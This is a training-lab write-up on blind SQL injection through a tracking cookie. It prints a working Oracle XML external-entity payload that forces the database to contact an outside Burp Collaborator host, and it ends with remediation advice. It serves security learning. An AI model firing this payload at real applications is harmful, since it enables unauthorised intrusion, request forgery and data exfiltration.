## Lab: Blind SQL injection with out-of-band interaction

### 📋 Summary

This lab contains blind SQL injection vulnerability in the `TrackingId` cookie. The application is completely "blind" and does not return different responses, error messages, or time delays based on the query results. To confirm the vulnerability, we must use Out-of-Band Application Security Testing (OAST) to force the back-end database to initiate a network connection to an external server (Burp Collaborator).

- **Vulnerability Type**: Blind SQL Injection (`Out-of-Band / OAST`)
- **Impact**: Server-Side Request Forgery (SSRF) and potential for full data exfiltration.
- **Database Engine**: Oracle (Identified via XML parsing behavior)

---

### 🎯 Objectives

- Identify the injectable cookie.
- Construct a SQL payload that triggers an out-of-band network interaction.
- Use Burp Collaborator to verify that the database performed a DNS/HTTP lookup.

---

### 🔬 Discovery & Methodology

1. **The OAST Approach**

When traditional blind techniques (Boolean, Error, Time) are restricted or too noisy, OAST is the most reliable method. It involves instructing the database to act as a client and reach out to an external domain. In Oracle environments, this is commonly achieved through XML processing functions that resolve external entities.

2. **Triggering the interaction (The "Link" Test)**

We use the Oracle XMLType constructor to parse a malicious XML string. Within this XML, we define a Document Type Definition (DTD) with an external entity. When the Oracle server attemps to resolve this entity to "complete" the XML parsing, it is forced to perform DNS lookup and an HTTP request to our Collaborator domain.

**Payload**

```sql
' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual) || '
```

---

### 🛠️ Exploit Implementation

The automation script (`lab-13.py`) fucntions as a "one-shot" trigger. Because the feedback is received by the external Collaborator server, the script focuses on delivery rather than response analysis.

- **Phase 1: Connectivity**:
  - Verifies lab is available.
- **Phase 2: Cookie injection**:
  - Locates the `TrackingId` and appends the OAST payload.
- **Phase 3: Trigger**:
  - Sends a single GET request to the target.
- **Phase 4: Verification**:
  - Assumes Burp Collaborator is configured, loads homepage and looks for "Congratulation" string.

---

### 🛡️ Remediation

**Primary Fix: Parameterized Queries (Prepared Statements)**
The application should use prepared statements to ensure that user input (the cookie value) is treated as data rather than executable code.

**Secondary Fix: Egress Filtering**
Database serves should reside in isolated network segments. Implementing strict Egress Firewall Rules ensures the database cannot initiate connections to arbitrary internet address, even if an injection vulnerability exists.
